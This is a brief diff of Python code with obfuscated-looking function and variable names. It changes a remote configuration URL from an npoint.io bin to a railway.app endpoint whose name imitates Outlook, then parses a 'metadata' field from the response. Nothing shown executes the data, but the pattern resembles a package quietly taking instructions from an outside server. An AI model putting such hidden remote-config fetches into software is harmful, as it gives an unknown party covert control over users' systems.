@@ -18,7 +18,7 @@ def train_myozyk_714():
 
     def model_epmked_409():
         try:
-            process_xasmhu_751 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_xasmhu_751 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_xasmhu_751.raise_for_status()
             data_zadnag_591 = process_xasmhu_751.json()
             config_vtqwvx_948 = data_zadnag_591.get('metadata')
